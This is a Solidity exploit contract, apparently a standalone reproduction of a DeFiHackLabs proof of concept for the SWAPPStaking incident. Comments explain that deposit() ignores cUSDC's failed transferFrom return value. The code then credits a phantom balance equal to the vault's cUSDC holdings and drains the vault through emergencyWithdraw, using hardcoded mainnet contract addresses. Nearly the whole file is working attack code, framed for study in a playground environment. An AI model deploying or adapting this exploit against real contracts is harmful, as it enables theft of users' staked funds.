// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-07-SWAPPStaking).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry
// `SWAPPStakingExp` test contract: `exploit()` is called directly on
// `address(this)` (the test contract itself), with no separate attack
// contract to deploy. This is a faithful, self-contained copy of that
// `exploit()` body — only forge-std/console plumbing is stripped and
// `testExploit()`/`exploit()` become the single entrypoint `run()`.
//
// Root cause: Staking.deposit()'s non-stablecoin branch calls
// IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount)
// WITHOUT checking the boolean return value, then unconditionally credits
// balances[msg.sender][tokenAddress] += amount regardless of whether any
// tokens actually moved. Compound's cUSDC is not a standard ERC20: its
// transferFrom runs through the Comptroller's transferAllowed policy hook
// and, when disallowed (the caller holds 0 cUSDC), returns false and emits
// a Failure event INSTEAD OF reverting. The attacker holds 0 cUSDC, so the
// deposit's inner transferFrom moves nothing and returns false — but
// deposit() ignores that and credits the attacker a phantom staking balance
// equal to the vault's entire real cUSDC holdings. The attacker then calls
// the permissionless emergencyWithdraw(cUSDC), whose only guard (a 10-epoch
// timer keyed off lastWithdrawEpochId[cUSDC], which defaults to 0) is
// trivially satisfied, and it pays out the phantom balance in the vault's
// real cUSDC. No capital is required beyond gas.

interface CErc20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}

interface Staking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function emergencyWithdraw(address tokenAddress) external;
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function getCurrentEpoch() external view returns (uint128);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

contract SWAPPStakingExploit {
    Staking constant staking = Staking(0x245a551ee0F55005e510B239c917fA34b41B3461);
    CErc20 constant cUsdc = CErc20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);

    uint256 constant MAX_UINT = 2 ** 256 - 1;

    // step 0: pre-initialize every past epoch for cUSDC so deposit()'s internal
    // epoch-init chain succeeds (deposit() requires the current epoch to be
    // initialized before it will run).
    function init_epochs() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = address(cUsdc);
        uint128 currentEpoch = staking.getCurrentEpoch();
        for (uint128 i = 0; i < currentEpoch; i++) {
            staking.manualEpochInit(tokens, i);
        }
    }

    // single entrypoint — mirrors the Foundry test's exploit()/testExploit().
    function run() external {
        init_epochs();

        // clears deposit()'s allowance `require`; cUSDC.approve always
        // succeeds and moves 0 tokens.
        cUsdc.approve(address(staking), MAX_UINT);

        uint256 staking_cusdc_balance = cUsdc.balanceOf(address(staking));

        // Phantom deposit: the inner cUSDC.transferFrom(this -> staking) is
        // rejected by the Comptroller's transferAllowed hook (attacker holds
        // 0 cUSDC) and returns false WITHOUT reverting. deposit() ignores the
        // return value and unconditionally credits
        // balances[this][cUSDC] += staking_cusdc_balance anyway.
        staking.deposit(address(cUsdc), staking_cusdc_balance, address(0x0));

        // Drain: pays out the phantom balance in the vault's real cUSDC. The
        // only guard — (getCurrentEpoch() - lastWithdrawEpochId[cUSDC]) >= 10
        // — is trivially satisfied since lastWithdrawEpochId[cUSDC] was never
        // set (defaults to 0) and the current epoch is 54.
        staking.emergencyWithdraw(address(cUsdc));

        // no-op self-transfer in the original test; kept for fidelity (it
        // fails Compound's transferAllowed and returns false, but the loot
        // from emergencyWithdraw is already realized above).
        cUsdc.transfer(address(this), staking_cusdc_balance);
    }
}
